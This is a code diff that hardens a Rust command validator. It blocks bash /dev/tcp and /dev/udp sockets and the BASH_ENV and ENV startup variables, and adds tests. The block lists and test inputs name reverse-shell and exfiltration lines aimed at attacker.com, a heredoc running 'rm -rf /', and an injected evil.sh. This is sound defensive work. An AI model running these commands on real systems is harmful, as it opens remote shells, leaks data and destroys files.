@@ -117,6 +117,9 @@ const BLOCKLIST: &[&str] = &[
     // Shell builtins for script/coprocess execution
     "source ", // Executes script in current shell context
     "coproc ", // Background coprocess with bidirectional pipes
+    // Bash virtual files for reverse shells (no nc needed)
+    "/dev/tcp/",
+    "/dev/udp/",
     // Privilege escalation (su; sudo already covered above)
     "su ",
     // ── Windows-specific dangerous patterns ──
@@ -169,6 +172,9 @@ const SHELL_INJECTION_PATTERNS: &[&str] = &[
     "`",  // Bash process substitution — executes commands via /dev/fd
     "<(", // Here-string — feeds arbitrary input to interpreters
     "<<<",
+    // Note: `<<` (heredoc) intentionally NOT included — too many false positives
+    // in data contexts (bit shifts, C++ streams). Heredoc injection is caught by
+    // the general blocklist (sh -c, bash -c) and the newline injection check.
     // Shell control operators — command chaining and redirection.
     // Injected via data, these enable running arbitrary follow-up commands
     // or redirecting output to overwrite files.
@@ -604,6 +610,9 @@ const BLOCKED_ENV_VARS: &[&str] = &[
     "LD_AUDIT",
     "LD_PROFILE",
     "PATH",
+    // Shell startup injection: sourced before command execution
+    "BASH_ENV", // Sourced by bash before `-c` execution
+    "ENV",      // Sourced by sh/dash on interactive startup
 ];
 
 /// Validate environment variables for dangerous names.
@@ -2393,6 +2402,46 @@ mod tests {
     // =========================================================================
     // Blocklist: additional bash builtins
     // =========================================================================
+
+    // =========================================================================
+    // Agent audit findings: env var, /dev/tcp, heredoc
+    // =========================================================================
+
+    #[test]
+    fn env_vars_block_bash_env() {
+        // BASH_ENV is sourced by bash before -c execution → code injection
+        let result = validate_env_vars(&[("BASH_ENV".into(), "/tmp/evil.sh".into())]);
+        assert!(result.is_err(), "BASH_ENV must be blocked");
+    }
+
+    #[test]
+    fn env_vars_block_env_variable() {
+        // ENV is sourced by sh/dash on interactive startup
+        let result = validate_env_vars(&[("ENV".into(), "/tmp/evil.sh".into())]);
+        assert!(result.is_err(), "ENV must be blocked");
+    }
+
+    #[test]
+    fn blocklist_rejects_dev_tcp() {
+        // /dev/tcp is bash-specific virtual file for reverse shells
+        let err = check_blocklist("exec 3<>/dev/tcp/attacker.com/4444").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+    }
+
+    #[test]
+    fn blocklist_rejects_dev_udp() {
+        let err = check_blocklist("echo data > /dev/udp/attacker.com/53").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+    }
+
+    #[test]
+    fn heredoc_caught_by_existing_blocklist() {
+        // << (heredoc) is NOT in SHELL_INJECTION_PATTERNS (too many false positives
+        // with bit shifts, C++ streams). But heredoc-based injection is caught by
+        // the general blocklist: `sh -c` and `rm -rf /` are both blocked.
+        let err = check_blocklist("sh <<EOF\nrm -rf /\nEOF").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+    }
 
     #[test]
     fn blocklist_rejects_source_builtin() {
